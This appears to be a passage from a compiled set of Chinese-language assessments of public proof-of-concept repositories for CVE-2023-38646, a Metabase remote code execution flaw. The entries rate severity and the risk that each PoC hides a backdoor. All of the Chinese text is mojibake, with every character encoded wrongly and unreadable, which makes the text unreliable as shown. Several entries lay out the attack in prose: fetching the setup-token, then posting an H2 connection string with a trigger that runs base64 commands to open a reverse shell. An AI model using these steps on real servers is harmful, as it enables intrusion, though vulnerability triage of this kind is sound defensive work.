2.  **æ„é€ æ¶æ„Payload:**  è„šæœ¬æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„Javaä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨æ—¶æ‰§è¡Œä¸€æ®µ JavaScript ä»£ç ã€‚
3.  **æ‰§è¡Œå‘½ä»¤:**  JavaScript ä»£ç è°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œä¸€ä¸ªåŒ…å«base64ç¼–ç çš„bashå‘½ä»¤ã€‚æ­¤å‘½ä»¤è§£ç å¹¶æ‰§è¡Œåå‘shellå‘½ä»¤ã€‚
4.  **å‘é€Payload:**  æ„é€ å¥½çš„payloadé€šè¿‡POSTè¯·æ±‚å‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚
5.  **åå‘Shell:**  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼Œæ”»å‡»è€…å°†åœ¨æŒ‡å®šçš„IPåœ°å€å’Œç«¯å£ä¸Šè·å¾—ä¸€ä¸ªåå‘shellã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„ä»£ç ä¸»è¦æ˜¯åˆ©ç”¨æ¼æ´è·å–åå‘shellã€‚é€šè¿‡æ£€æŸ¥ä»£ç ï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚åˆ é™¤æ–‡ä»¶ã€ä¼ æ’­æ¶æ„è½¯ä»¶ç­‰ã€‚ä»£ç ç»“æ„æ¸…æ™°ï¼Œç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ã€‚è™½ç„¶ä»£ç æœ¬èº«æ˜¯ä¸ºäº†æ”»å‡»ï¼Œä½†å®ƒæ²¡æœ‰ä¸»åŠ¨è¿›è¡Œæ¶æ„ä¼ æ’­æˆ–å…¶ä»–ç ´åè¡Œä¸ºã€‚è€ƒè™‘åˆ°ä»£ç çš„åŠŸèƒ½ä¸»è¦æ˜¯æ¼æ´åˆ©ç”¨ï¼Œè€Œéæ¤å…¥åé—¨æˆ–è¿›è¡Œå…¶ä»–æ¶æ„æ´»åŠ¨ï¼Œå› æ­¤åˆ¤å®šå­˜åœ¨æŠ•æ¯’ä»£ç çš„å¯èƒ½æ€§è¾ƒä½ã€‚

è¯¥é¡¹ç›®ä¸­å¯èƒ½å­˜åœ¨æŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œè¯„ä¼°ç»“æœä¸º1%ã€‚

**é¡¹ç›®åœ°å€:** [Mrunalkaran/CVE-2023-38646](https://github.com/Mrunalkaran/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #10

**æ¥æº**: [CVE-2023-38646-Pyr0sec_CVE-2023-38646.md](../2023/CVE-2023-38646-Pyr0sec_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (Open Source) å’Œ < 1.46.6.1 (Enterprise)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿè¿è¡Œå—å½±å“ç‰ˆæœ¬çš„Metabaseï¼Œä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®è¯¥Metabaseå®ä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 2%

## è¯¦æƒ…

CVE-2023-38646æ˜¯ä¸€ä¸ªå­˜åœ¨äºMetabaseçš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨å—å½±å“çš„MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å¤šä¸ªä¿¡æ¯æ¥æºéƒ½ç¡®è®¤äº†æ­¤æ¼æ´çš„å­˜åœ¨å’Œé«˜å±æ€§ï¼Œå¹¶æä¾›äº†å¯åˆ©ç”¨çš„POCã€‚æ¼æ´åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„è¯·æ±‚ï¼Œè§¦å‘Metabaseä¸­çš„ååºåˆ—åŒ–æˆ–å…¶ä»–ç±»å‹çš„æ¼æ´ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š** æ¼æ´åº“ä¿¡æ¯å’Œå¤šä¸ªæœç´¢å¼•æ“ç»“æœè¡¨æ˜å­˜åœ¨å…¬å¼€å¯ç”¨çš„PoCï¼Œè¯æ˜äº†æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š** æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç åªåŒ…å«Apache Licenseã€‚å¹¶æ²¡æœ‰å‘ç°ä»»ä½•ç›´æ¥çš„æŠ•æ¯’ä»£ç ã€‚é€šå¸¸ï¼ŒæŠ•æ¯’å¯èƒ½å­˜åœ¨äºæ›´å¤æ‚çš„expæˆ–è€…åº“çš„ä¾èµ–ä¸­,ä¾‹å¦‚ï¼Œä¸€äº›å¼€å‘è€…å¯èƒ½åœ¨çœ‹ä¼¼æ— å®³çš„ä»£ç ä¸­åµŒå…¥åé—¨ï¼Œè¿™äº›åé—¨åœ¨ç‰¹å®šæ¡ä»¶ä¸‹è¢«è§¦å‘ï¼Œä»è€Œå…è®¸æ”»å‡»è€…è¿œç¨‹æ§åˆ¶å—æ„ŸæŸ“çš„ç³»ç»Ÿã€‚æœ¬æ¬¡PoCçš„æŠ•æ¯’åˆ†æå æ¯”ä¸º2%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **ç¡®å®šç›®æ ‡ï¼š** ç¡®å®šè¿è¡ŒMetabaseçš„æœåŠ¡å™¨ï¼Œå¹¶ç¡®è®¤å…¶ç‰ˆæœ¬æ˜¯å¦åœ¨å—å½±å“çš„èŒƒå›´å†…ï¼ˆä½äº0.46.6.1çš„å¼€æºç‰ˆæœ¬æˆ–ä½äº1.46.6.1çš„ä¼ä¸šç‰ˆæœ¬ï¼‰ã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚ï¼š** ä½¿ç”¨å·²çŸ¥çš„PoCæˆ–expæ„é€ åŒ…å«æ¶æ„ä»£ç çš„è¯·æ±‚ã€‚å…·ä½“çš„è¯·æ±‚æ ¼å¼å–å†³äºæ¼æ´çš„ç»†èŠ‚ï¼Œå¯èƒ½æ¶‰åŠå‘é€ç‰¹åˆ¶çš„JSONæ•°æ®ã€åˆ©ç”¨SQLæ³¨å…¥æˆ–å…¶ä»–ç±»å‹çš„æ¼æ´ã€‚
3.  **å‘é€è¯·æ±‚ï¼š** å°†æ„é€ çš„æ¶æ„è¯·æ±‚å‘é€åˆ°MetabaseæœåŠ¡å™¨çš„ç‰¹å®šç«¯ç‚¹ã€‚
4.  **æ‰§è¡Œä»£ç ï¼š** å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒMetabaseæœåŠ¡å™¨å°†æ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„ä»£ç ï¼Œä»è€Œå…è®¸æ”»å‡»è€…æ§åˆ¶æœåŠ¡å™¨ã€‚


**é¡¹ç›®åœ°å€:** [Pyr0sec/CVE-2023-38646](https://github.com/Pyr0sec/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #11

**æ¥æº**: [CVE-2023-38646-Red4mber_CVE-2023-38646.md](../2023/CVE-2023-38646-Red4mber_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”æœªè¿›è¡Œç›¸åº”è¡¥ä¸ä¿®å¤ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹æ®Šçš„è¯·æ±‚åˆ©ç”¨æ­¤æ¼æ´åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š** æ”»å‡»è€…é¦–å…ˆå‘ `/api/session/properties` ç«¯ç‚¹å‘é€ GET è¯·æ±‚ï¼Œä»¥è·å– `setup-token`ã€‚è¿™ä¸ªtokenç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚ï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ SQL æ³¨å…¥çš„ JSON payloadï¼Œå¹¶å°†å…¶å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚
    *   Payload çš„ `details` å­—æ®µåŒ…å«ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ `TRACE_LEVEL_SYSTEM_OUT=1` å¼€å¯äº†è·Ÿè¸ªï¼Œ`CREATE TRIGGER` ç”¨äºåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨æ—¶æ‰§è¡Œ JavaScript ä»£ç ã€‚
    *   JavaScript ä»£ç ä½¿ç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œç»è¿‡ Base64 ç¼–ç çš„å‘½ä»¤ã€‚
3.  **æ‰§è¡Œå‘½ä»¤ï¼š** å½“ Metabase å°è¯•éªŒè¯æ•°æ®åº“è¿æ¥æ—¶ï¼Œæ¶æ„ SQL æ³¨å…¥ä¼šè¢«è§¦å‘ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æä¾›çš„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æä¾›çš„PoCä»£ç æœ‰æ•ˆã€‚ä»£ç é€šè¿‡å‘é€æ¶æ„è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£æ¥è§¦å‘æ¼æ´ã€‚ä»£ç é¦–å…ˆé€šè¿‡`/api/session/properties`è·å–tokenï¼Œç„¶åä½¿ç”¨åŒ…å«æ¶æ„SQLæ³¨å…¥çš„JSONæ•°æ®åŒ…é€šè¿‡POSTæ–¹æ³•å‘é€åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

è¯¥POCä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´å®ç°RCEï¼Œæ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚
è™½ç„¶å­˜åœ¨æ‰§è¡Œä»»æ„å‘½ä»¤çš„é£é™©ï¼Œä½†æ˜¯payloadæ˜¯ç”±ä½¿ç”¨è€…æä¾›çš„ã€‚ä»£ç æœ¬èº«åªè´Ÿè´£æ„é€ å’Œå‘é€è¯·æ±‚ï¼Œé£é™©æ˜¯RCEæœ¬èº«å¸¦æ¥çš„ï¼Œè€Œä¸æ˜¯ä»£ç ä½œè€…æ¤å…¥çš„åé—¨ã€‚
å­˜åœ¨æä½çš„æŠ•æ¯’é£é™© (å¤§çº¦1%)ï¼Œè¯¥é£é™©æ¥è‡ªäºä½œè€…å¯èƒ½ä¼šåœ¨ä»£ç é€»è¾‘ä¸Šå­˜åœ¨ä¸€äº›éšè—çš„åé—¨ï¼Œä½†æ˜¯ä»£ç æ•´ä½“ç»“æ„å’Œé€»è¾‘éƒ½æ¯”è¾ƒç®€å•ï¼Œéšè—åé—¨çš„éš¾åº¦è¾ƒé«˜ã€‚


**é¡¹ç›®åœ°å€:** [Red4mber/CVE-2023-38646](https://github.com/Red4mber/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #12

**æ¥æº**: [CVE-2023-38646-Shisones_MetabaseRCE_CVE-2023-38646.md](../2023/CVE-2023-38646-Shisones_MetabaseRCE_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è¢«ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨å—å½±å“çš„ Metabase å®ä¾‹ä¸Šæ‰§è¡Œè¿œç¨‹ä»£ç ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨æœ‰æ•ˆã€‚åˆ©ç”¨æ–¹å¼æ¶‰åŠå‘é€ç‰¹åˆ¶çš„è¯·æ±‚åˆ° Metabase æœåŠ¡å™¨ï¼Œåˆ©ç”¨å…¶å­˜åœ¨çš„æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å·²ç¡®è®¤å¹¶ä¸”å­˜åœ¨å¯åˆ©ç”¨çš„PoCã€‚æœç´¢å¼•æ“ç»“æœä¸­å¤šä¸ªé“¾æ¥æŒ‡å‘äº†æ¼æ´çš„è¯¦ç»†æè¿°ã€åˆ©ç”¨æ–¹æ³•å’ŒPoCä»£ç ï¼Œè¯æ˜äº†å…¶æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„Cargo.lockæ–‡ä»¶åªæ˜¯Rusté¡¹ç›®çš„ä¾èµ–é”å®šæ–‡ä»¶ï¼Œæœ¬èº«ä¸åŒ…å«å¯æ‰§è¡Œä»£ç ã€‚è¯„ä¼°æŠ•æ¯’é£é™©éœ€è¦æŸ¥çœ‹å®Œæ•´çš„æºä»£ç ï¼Œä½†ä»…å‡­Cargo.lockæ–‡ä»¶å¾ˆéš¾åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚è€ƒè™‘åˆ°ç¼ºä¹ç›´æ¥çš„æ¶æ„ä»£ç è¯æ®ï¼Œä»¥åŠæ¼æ´åˆ©ç”¨ä¸»è¦ä¾èµ–äºMetabaseæœ¬èº«çš„æ¼æ´ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

æ ¹æ®æœç´¢ç»“æœï¼Œæ”»å‡»è€…åˆ©ç”¨æ­¤æ¼æ´ï¼Œé€šè¿‡å‘é€ç‰¹åˆ¶çš„æ¶æ„è¯·æ±‚åˆ°MetabaseæœåŠ¡å™¨ï¼Œä»è€Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ— éœ€èº«ä»½éªŒè¯å³å¯è§¦å‘æ­¤æ¼æ´ã€‚


**é¡¹ç›®åœ°å€:** [Shisones/MetabaseRCE_CVE-2023-38646](https://github.com/Shisones/MetabaseRCE_CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #13

**æ¥æº**: [CVE-2023-38646-UserConnecting_Exploit-CVE-2023-38646-Metabase.md](../2023/CVE-2023-38646-UserConnecting_Exploit-CVE-2023-38646-Metabase.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** 0.46.6.1ä¹‹å‰ (å¼€æºç‰ˆ), 1.46.6.1ä¹‹å‰ (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬å—å½±å“ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨çš„æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯ï¼š

1.  **æ¼æ´åŸç†ï¼š** è¯¥æ¼æ´å­˜åœ¨äº Metabase çš„ `/api/setup/validate` æ¥å£ï¼Œåˆ©ç”¨äº† H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡åœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­æ’å…¥æ¶æ„ SQL è¯­å¥æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚
2.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   **è·å– `setup-token`ï¼š**  é€šè¿‡è®¿é—® `/api/session/properties` è·å– `setup-token`ã€‚
    *   **æ„é€ æ¶æ„è¯·æ±‚ï¼š**  æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ H2 è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadï¼Œè¯¥è¿æ¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ª `CREATE TRIGGER` è¯­å¥ï¼Œè¯¥è¯­å¥åœ¨æ¯æ¬¡æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` æ—¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
    *   **å‘é€è¯·æ±‚ï¼š**  å°†æ„é€ çš„ JSON payload å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚

3.  **POC åˆ†æï¼š** æä¾›çš„ Python è„šæœ¬ `metabase_exploit.py` å®ç°äº†ä¸Šè¿°æ­¥éª¤ï¼š
    *   å®ƒæ¥å— Metabase çš„ URLã€`setup-token`ã€æ“ä½œç±»å‹ï¼ˆ`exec` æˆ– `revshell`ï¼‰å’Œå‘½ä»¤ä½œä¸ºå‚æ•°ã€‚
    *   å®ƒä½¿ç”¨ `command_encoding` å‡½æ•°å¯¹å‘½ä»¤è¿›è¡Œ Base64 ç¼–ç ï¼Œå¹¶å¤„ç†å¡«å……å­—ç¬¦ `=`ã€‚
    *   å®ƒæ„é€ åŒ…å«æ¶æ„ H2 è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚
    *   å®ƒå‘é€ POST è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£ã€‚

4.  **æœ‰æ•ˆæ€§ï¼š** æ ¹æ®æ¼æ´æè¿°å’Œæä¾›çš„ PoC ä»£ç ï¼Œè¯¥ PoC æ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

5.  **æŠ•æ¯’é£é™©ï¼š**
    *   ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯æ„é€ å¹¶å‘é€æ¶æ„è¯·æ±‚ï¼Œé£é™©è¾ƒä½ã€‚
    *   `command_encoding` å‡½æ•°çœ‹èµ·æ¥æ­£å¸¸ï¼Œç”¨äºé¿å…Base64ç¼–ç ä¸­çš„å¡«å……å­—ç¬¦çš„é—®é¢˜ï¼Œä½†ä¹Ÿæœ‰å¯èƒ½å­˜åœ¨å…¶ä»–ç¼–ç æ¼æ´ã€‚
    *   ä»£ç æ˜ç¡®å£°æ˜ä»…ç”¨äºæ•™è‚²ç›®çš„ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ä½œè€…æ¤å…¥åé—¨çš„å¯èƒ½ã€‚
    *   æ€»ä½“è€Œè¨€ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œå¤§æ¦‚åœ¨1%å·¦å³ã€‚ä¸»è¦é£é™©åœ¨äºä½¿ç”¨è€…æ˜¯å¦ä¼šç”¨æ­¤ä»£ç æ‰§è¡Œéæ³•æ“ä½œã€‚

ç»¼ä¸Šæ‰€è¿°ï¼ŒCVE-2023-38646 æ˜¯ä¸€ä¸ªä¸¥é‡çš„å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æä¾›çš„ PoC ä»£ç å¯ä»¥æœ‰æ•ˆåˆ©ç”¨è¯¥æ¼æ´ï¼Œä½¿ç”¨è€…åº”è¯¥è°¨æ…å¯¹å¾…ï¼Œé¿å…æ»¥ç”¨ã€‚ä»£ç æœ¬èº«å…·æœ‰è½»å¾®çš„æŠ•æ¯’é£é™©ï¼Œä¸»è¦åœ¨äºç¼–ç å’Œå£°æ˜çš„å…è´£å£°æ˜ä¹‹é—´çš„æ½œåœ¨çŸ›ç›¾ã€‚

**é¡¹ç›®åœ°å€:** [UserConnecting/Exploit-CVE-2023-38646-Metabase](https://github.com/UserConnecting/Exploit-CVE-2023-38646-Metabase)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #14

**æ¥æº**: [CVE-2023-38646-XiaomingX_cve-2023-38646-poc.md](../2023/CVE-2023-38646-XiaomingX_cve-2023-38646-poc.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å®Œå…¨æ§åˆ¶æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªè¿›è¡Œèº«ä»½éªŒè¯é…ç½®æˆ–å·²å®Œæˆåˆå§‹è®¾ç½®ä½†æœªæ‰§è¡Œåç»­å®‰å…¨åŠ å›ºã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢å¼•æ“ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨çš„æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´åˆ©ç”¨æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢å¼•æ“ç»“æœä»¥åŠæä¾›çš„PoCä»£ç ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚å­˜åœ¨å¤šä¸ªå…¬å¼€çš„PoCï¼Œè¯æ˜è¯¥æ¼æ´å¯ä»¥è¢«æˆåŠŸåˆ©ç”¨ã€‚

æä¾›çš„PoCä»£ç  `CVE-2023-38646-POC.py` æ—¨åœ¨è·å– Metabase å®ä¾‹çš„ setup-tokenã€‚å¦‚æœ Metabase å®ä¾‹å¤„äºæœªè®¾ç½®çŠ¶æ€ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤ token è¿›è¡Œåˆå§‹åŒ–è®¾ç½®ï¼Œå¹¶è¿›ä¸€æ­¥åˆ©ç”¨å…¶ RCE çš„èƒ½åŠ›ã€‚

æä¾›çš„PoCä»£ç  `CVE-2023-38646-Reverse-Shell.py` å¯èƒ½ç”¨äºæ›´è¿›ä¸€æ­¥çš„åˆ©ç”¨ï¼Œå°è¯•è·å–Metabaseçš„ç‰ˆæœ¬ä¿¡æ¯å’Œsetup tokenã€‚

**æŠ•æ¯’é£é™©ï¼š**

PoC ä»£ç  `CVE-2023-38646-POC.py` ä¸»è¦åŠŸèƒ½æ˜¯å‘ç°æœªé…ç½®çš„ Metabase å®ä¾‹å¹¶è·å– setup tokenï¼Œæœ¬èº«æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚ ä½†æ˜¯ï¼Œä¸èƒ½å®Œå…¨æ’é™¤å…¶ä½œè€…åœ¨ä»£ç ä¸­éšè—æ¶æ„ä»£ç çš„å¯èƒ½æ€§ï¼Œä¾‹å¦‚åœ¨è·å– token åå°è¯•æ‰§è¡Œå…¶ä»–æ“ä½œï¼Œæˆ–è€…å°† token å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨ã€‚é£é™©è¯„ä¼°ä¸º 10%ã€‚

PoC ä»£ç  `CVE-2023-38646-Reverse-Shell.py` åŒæ ·æ˜¯æ¼æ´åˆ©ç”¨ç›¸å…³ï¼Œä¸»è¦æ¶‰åŠè·å–setup tokenç­‰ä¿¡æ¯ã€‚éœ€è¦äººå·¥å®¡è®¡è¯¥éƒ¨åˆ†ä»£ç ï¼Œè¿›ä¸€æ­¥ç¡®è®¤æ˜¯å¦å­˜åœ¨æ¤å…¥åé—¨çš„é£é™©ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **ä¿¡æ¯æ”¶é›†ï¼š** æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡ Metabase å®ä¾‹çš„ç‰ˆæœ¬æ˜¯å¦åœ¨å—å½±å“çš„èŒƒå›´å†…ã€‚é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹å¯ä»¥è·å– Metabase ç‰ˆæœ¬ã€‚
2.  **è·å–Setup Token (å¦‚æœæœªè®¾ç½®):** å¦‚æœ Metabase å®ä¾‹å°šæœªå®Œæˆåˆå§‹åŒ–è®¾ç½®ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹è·å– setup-tokenã€‚è¿™ä¸ªtokenå¯ä»¥ç”¨æ¥å®ŒæˆMetabaseçš„åˆå§‹åŒ–ã€‚
